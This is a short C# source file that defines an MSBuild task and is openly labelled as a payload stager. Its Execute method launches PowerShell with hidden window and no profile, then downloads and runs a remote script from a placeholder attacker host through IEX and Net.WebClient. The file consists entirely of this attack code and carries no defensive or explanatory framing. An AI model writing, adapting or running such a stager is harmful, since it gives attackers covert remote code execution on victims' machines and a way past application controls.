using System;
using System.Diagnostics;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class MSBuildTask : Task
{
  public override bool Execute()
  {
    // ── Payload — download + run your PowerShell stager / payload ──
    string cmd = "-nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://<IP>/run.ps1')\"";
    Process.Start("powershell.exe", cmd);
    return true;
  }
}
